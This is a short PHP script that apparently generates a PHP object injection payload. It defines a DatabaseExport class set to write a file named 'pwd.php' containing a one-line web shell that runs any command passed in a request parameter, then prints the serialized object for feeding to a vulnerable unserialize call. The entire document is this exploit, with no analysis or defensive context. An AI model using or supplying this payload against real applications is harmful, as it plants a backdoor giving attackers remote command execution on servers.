<?php
class DatabaseExport
{
    public $user_file = 'pwd.php';
    public $data = '<?php system($_REQUEST["cmd"]);?>';
}

$app = new DatabaseExport;
echo serialize($app);
?>
